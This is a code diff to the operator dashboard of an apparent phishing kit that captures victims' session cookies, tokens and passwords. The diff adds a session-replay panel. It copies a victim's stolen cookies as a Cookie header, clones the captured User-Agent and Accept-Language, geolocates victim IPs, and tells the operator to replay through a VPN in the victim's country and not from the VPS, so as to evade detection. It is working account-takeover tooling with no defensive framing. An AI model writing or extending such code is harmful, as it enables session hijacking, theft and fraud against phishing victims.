@@ -107,7 +107,7 @@
   .chk { display: inline-flex; align-items: center; gap: 6px; color: var(--mute); cursor: pointer; user-select: none; font-size: 13px; }
   .count { margin-left: auto; color: var(--faint); font-size: 12px; font-family: var(--mono); }
 
-  .stage { flex: 1; display: grid; grid-template-rows: 1fr minmax(200px, 34vh); min-height: 0; }
+  .stage { flex: 1; display: grid; grid-template-rows: 1fr minmax(280px, 44vh); min-height: 0; }
   .tablewrap { overflow: auto; }
   table { border-collapse: collapse; width: 100%; min-width: 720px; }
   thead th {
@@ -162,6 +162,13 @@
   .vstate { display: flex; align-items: center; gap: 10px; margin-top: 12px; flex-wrap: wrap; }
   .vstate input.notes { flex: 1; min-width: 180px; background: var(--bg2); border: 1px solid var(--line); padding: 6px 8px; border-radius: 2px; }
   .empty-insp { color: var(--faint); padding: 24px 4px; }
+  .replay { border: 1px solid var(--line); border-left: 3px solid var(--copper); padding: 12px 14px; margin: 0 0 14px; background: var(--bg2); }
+  .replay h3 { margin: 0 0 6px; font-size: 14px; font-weight: 600; }
+  .replay .steps { margin: 8px 0 10px; padding-left: 18px; }
+  .replay .steps li { margin: 2px 0; }
+  .replay .warn { color: var(--bad); }
+  .replay .hdr { font-family: var(--mono); font-size: 12px; word-break: break-all; background: var(--bg); border: 1px solid var(--line); padding: 6px 8px; margin-top: 3px; }
+  .replay .hint { color: var(--faint); font-size: 11px; }
 
   #urlsview, #settingsview, #luresview, #dashview { padding: 12px 16px 40px; overflow: auto; flex: 1; }
   .dash-head { display: flex; align-items: flex-end; justify-content: space-between; gap: 16px; flex-wrap: wrap; margin-bottom: 18px; }
@@ -356,6 +363,15 @@ const I18N = {
     help_title:"Keys",
     help_items:[["/","search"],["1–6","switch view"],["j k","move"],["c","copy cookies"],["r","refresh"],["?","this list"],["esc","close"]],
     tokens:"Tokens", password:"Password", copy_user:"Copy account",
+    replay_title:"Replay (manual)", replay_match:"Match the victim",
+    replay_import:"Import cookies on", replay_then:"Then open", replay_avoid:"Do not use",
+    replay_headers:"Headers to clone", replay_suggested:"suggested from country — not captured",
+    replay_captured:"captured", replay_copy_ua:"Copy UA", replay_copy_al:"Copy Accept-Language",
+    replay_copy_hdr:"Copy Cookie header", replay_copy_brief:"Copy replay brief",
+    replay_brief_copied:"Replay brief copied", replay_hdr_copied:"Cookie header copied",
+    replay_geo_wait:"Country lookup pending…", replay_tz:"Timezone",
+    replay_vpn:"Use a VPN/exit in that country. Clone the UA. Do not replay from the VPS.",
+    geo_on:"GeoIP: ip-api.com (victim IPs, local cache)", geo_off:"GeoIP off",
     reveal_ph:"Click to show / hide",
     period_day:"Day", period_week:"Week", period_month:"Month",
     dash_day:"Today", dash_week:"This week", dash_month:"This month",
@@ -415,6 +431,15 @@ const I18N = {
     help_title:"Teclas",
     help_items:[["/","buscar"],["1–6","cambiar vista"],["j k","mover"],["c","copiar cookies"],["r","actualizar"],["?","esta lista"],["esc","cerrar"]],
     tokens:"Tokens", password:"Password", copy_user:"Copiar cuenta",
+    replay_title:"Replay (manual)", replay_match:"Igualar a la víctima",
+    replay_import:"Importar cookies en", replay_then:"Luego abrir", replay_avoid:"No uses",
+    replay_headers:"Cabeceras a clonar", replay_suggested:"sugerido por el país — no capturado",
+    replay_captured:"capturado", replay_copy_ua:"Copiar UA", replay_copy_al:"Copiar Accept-Language",
+    replay_copy_hdr:"Copiar cabecera Cookie", replay_copy_brief:"Copiar briefing de replay",
+    replay_brief_copied:"Briefing copiado", replay_hdr_copied:"Cabecera Cookie copiada",
+    replay_geo_wait:"Resolviendo país…", replay_tz:"Zona horaria",
+    replay_vpn:"VPN/salida en ese país. Clona el UA. No rejugues desde el VPS.",
+    geo_on:"GeoIP: ip-api.com (IPs de víctimas, cache local)", geo_off:"GeoIP off",
     reveal_ph:"Clic para ver / ocultar",
     period_day:"Día", period_week:"Semana", period_month:"Mes",
     dash_day:"Hoy", dash_week:"Esta semana", dash_month:"Este mes",
@@ -468,6 +493,74 @@ function ttlLabel(secs) {
   if (secs >= 86400) return t('ttl_days')(Math.floor(secs / 86400));
   if (secs >= 3600) return t('ttl_hours')(Math.floor(secs / 3600));
   return t('ttl_mins')(Math.max(1, Math.floor(secs / 60)));
+}
+function locLine(s) {
+  const g = s && s.geo;
+  if (!g || !g.country) return s && s.remote_addr ? esc(s.remote_addr) : '—';
+  let t = esc(g.country);
+  if (g.country_code) t += ' (' + esc(g.country_code) + ')';
+  if (g.city) t += ' · ' + esc(g.city);
+  if (g.region && g.region !== g.city) t += ', ' + esc(g.region);
+  return t;
+}
+function replayBrief(s) {
+  const g = s.geo || {};
+  const r = s.replay || {};
+  const loc = [g.country, g.country_code && '('+g.country_code+')', g.city].filter(Boolean).join(' ');
+  const net = [g.asn, g.isp].filter(Boolean).join(' · ');
+  const lines = [
+    t('replay_title') + ' · #' + s.id,
+    (r.label || s.kind || '') + (s.persistent ? ' · persist' : ''),
+    '',
+    t('replay_match'),
+    loc || s.remote_addr || '—',
+    net,
+    s.remote_addr || '',
+    r.ua_summary || '',
+    g.timezone ? t('replay_tz') + ': ' + g.timezone : '',
+    '',
+    'User-Agent (' + t('replay_captured') + '):',
+    s.useragent || '',
+    r.accept_lang ? 'Accept-Language (' + t('replay_suggested') + '):\n' + r.accept_lang : '',
+    '',
+    t('replay_import') + ': ' + (r.import_on || '—'),
+    t('replay_then') + ': ' + (r.then_open || '—'),
+    r.avoid ? t('replay_avoid') + ': ' + r.avoid : '',
+    '',
+    t('replay_vpn'),
+  ];
+  return lines.filter(x => x !== '').join('\n').replace(/\n{3,}/g, '\n\n');
+}
+function replayBox(s) {
+  if (!s) return '';
+  const r = s.replay || {};
+  const g = s.geo;
+  const net = g ? [g.asn, g.isp].filter(Boolean).join(' · ') : '';
+  const geo = g && g.country ? locLine(s) : (s.remote_addr ? esc(s.remote_addr) + ' · <span class="mut">' + t('replay_geo_wait') + '</span>' : '—');
+  return `<div class="replay">
+    <h3>${t('replay_title')}</h3>
+    <div class="mut">${esc(r.label || '')}${s.persistent ? ' · persist' : ''} · ${ttlCell(s)}</div>
+    <ol class="steps">
+      <li>${t('replay_import')}: <a href="${esc(r.import_on || '#')}" target="_blank" rel="noreferrer">${esc(r.import_on || '—')}</a></li>
+      <li>${t('replay_then')}: <a href="${esc(r.then_open || '#')}" target="_blank" rel="noreferrer">${esc(r.then_open || '—')}</a></li>
+      ${r.avoid ? `<li class="warn">${t('replay_avoid')}: ${esc(r.avoid)}</li>` : ''}
+    </ol>
+    <div class="k">${t('replay_match')}</div>
+    <div class="v">${geo}</div>
+    <div class="v mut">${esc(net)}</div>
+    <div class="v">${esc(s.remote_addr || '')}${g && g.timezone ? ' · ' + esc(g.timezone) : ''}</div>
+    <div class="v">${esc(r.ua_summary || '')}</div>
+    <div class="k" style="margin-top:8px">${t('replay_headers')}</div>
+    <div class="hdr">User-Agent <span class="hint">(${t('replay_captured')})</span><br>${esc(s.useragent || '—')}</div>
+    ${r.accept_lang ? `<div class="hdr">Accept-Language <span class="hint">(${t('replay_suggested')})</span><br>${esc(r.accept_lang)}</div>` : ''}
+    <div class="insp-actions" style="margin:10px 0 0">
+      ${s.useragent ? `<button class="btn" data-copytext="${esc(s.useragent)}">${t('replay_copy_ua')}</button>` : ''}
+      ${r.accept_lang ? `<button class="btn" data-copytext="${esc(r.accept_lang)}">${t('replay_copy_al')}</button>` : ''}
+      ${s.cookies ? `<button class="btn" data-copyhdr="${s.id}">${t('replay_copy_hdr')}</button>` : ''}
+      <button class="btn" data-copybrief="${s.id}">${t('replay_copy_brief')}</button>
+    </div>
+    <div class="hint" style="margin-top:8px">${t('replay_vpn')}</div>
+  </div>`;
 }
 function ttlCell(s) {
   if (!s || !s.valid) return '<span class="mut">—</span>';
@@ -830,7 +923,7 @@ function renderVictims() {
       <td>${ttlCell(v.best)}</td>
       <td class="num">${v.cookies}</td>
       <td class="num">${v.sessions.length}</td>
-      <td class="mut">${esc(v.lastIP)}</td>
+      <td class="mut">${v.best && v.best.geo && v.best.geo.country_code ? esc(v.best.geo.country_code) + ' · ' : ''}${esc(v.lastIP)}</td>
       <td class="mut" title="${absTime(v.lastUpdate)}">${relTime(v.lastUpdate)}</td>
     </tr>`;
   }).join('') : `<tr><td colspan="9" class="empty">${t('empty_victims')}</td></tr>`;
@@ -859,7 +952,7 @@ function renderSessions() {
       <td>${kindCell(s)}</td>
       <td>${ttlCell(s)}</td>
       <td class="num">${s.cookies}</td>
-      <td class="mut">${esc(s.remote_addr)}</td>
+      <td class="mut">${s.geo && s.geo.country_code ? esc(s.geo.country_code) + ' · ' : ''}${esc(s.remote_addr)}</td>
       <td class="mut" title="${absTime(s.update)}">${relTime(s.update)}</td>
     </tr>`;
   }).join('') : `<tr><td colspan="9" class="empty">${t('empty_sessions')}</td></tr>`;
@@ -883,6 +976,7 @@ function renderInspector() {
     box.innerHTML = `
       <h2>${esc(v.username)}</h2>
       <p class="sub">${kindCell(b)} · ${ttlCell(b)} · ${b ? b.cookies : 0} ${t('cookies_w')} · ${v.phishlets.map(esc).join(', ')}</p>
+      ${b ? replayBox(b) : ''}
       <div class="insp-actions">
         ${b && b.cookies ? `<button class="btn primary" data-copy="${b.id}">${t('copy_cookies')}</button>
           <button class="btn" data-view="${b.id}">${t('view_json')}</button>
@@ -929,6 +1023,7 @@ function renderInspector() {
   box.innerHTML = `
     <h2>${esc(s.username) || '#' + s.id}</h2>
     <p class="sub">#${s.id} · ${esc(s.phishlet)} · ${kindCell(s)} · ${ttlCell(s)} · ${s.token ? esc(s.token) : t('kind_none')}</p>
+    ${replayBox(s)}
     <div class="insp-actions">
       ${s.cookies ? `<button class="btn primary" data-copy="${s.id}">${t('copy_cookies')}</button>
         <button class="btn" data-view="${s.id}">${t('view_json')}</button>
@@ -945,6 +1040,13 @@ function renderInspector() {
     <div class="cookies-list" id="ckbox" hidden></div>`;
 }
 
+async function copyCookieHeader(id) {
+  try {
+    const txt = await (await fetch('/cookies?id=' + id + '&format=header')).text();
+    await navigator.clipboard.writeText(txt);
+    toast(t('replay_hdr_copied'));
+  } catch (e) { toast(t('error') + ': ' + e); }
+}
 async function copyCookies(id) {
   try {
     const r = await fetch('/cookies?id=' + id);
@@ -1073,7 +1175,7 @@ async function fetchData(force) {
     const phls = [...new Set(d.sessions.map(s => s.phishlet))].sort();
     sel.innerHTML = `<option value="">${t('all_phishlets')}</option>` + phls.map(p => `<option>${esc(p)}</option>`).join('');
     sel.value = cur;
-    $('#footsb').textContent = d.sb_enabled ? t('sb_on') : t('sb_off');
+    $('#footsb').textContent = (d.sb_enabled ? t('sb_on') : t('sb_off')) + ' · ' + (d.geo_enabled ? t('geo_on') : t('geo_off'));
     render();
     if (!state.firstLoad) state.knownIds = ids; else { state.knownIds = ids; state.firstLoad = false; }
   } catch (e) { toast(t('load_err') + ': ' + e); }
@@ -1105,6 +1207,17 @@ document.addEventListener('click', e => {
   if (sort) { const k = sort.dataset.sort; if (state.sort.key === k) state.sort.dir *= -1; else state.sort = { key: k, dir: -1 }; render(); return; }
   const copy = e.target.closest('[data-copy]');
   if (copy) { copyCookies(copy.dataset.copy); return; }
+  const ctxt = e.target.closest('[data-copytext]');
+  if (ctxt) { navigator.clipboard.writeText(ctxt.dataset.copytext).then(() => toast(t('url_copied'))).catch(err => toast(t('error') + ': ' + err)); return; }
+  const ch = e.target.closest('[data-copyhdr]');
+  if (ch) { copyCookieHeader(ch.dataset.copyhdr); return; }
+  const cb = e.target.closest('[data-copybrief]');
+  if (cb) {
+    const row = currentSel();
+    const sess = row && (row.type === 'victim' ? row.data.best : row.data);
+    if (sess) navigator.clipboard.writeText(replayBrief(sess)).then(() => toast(t('replay_brief_copied'))).catch(err => toast(t('error') + ': ' + err));
+    return;
+  }
   const view = e.target.closest('[data-view]');
   if (view) { window.open('/cookies?id=' + view.dataset.view, '_blank'); return; }
   const ck = e.target.closest('[data-ck]');
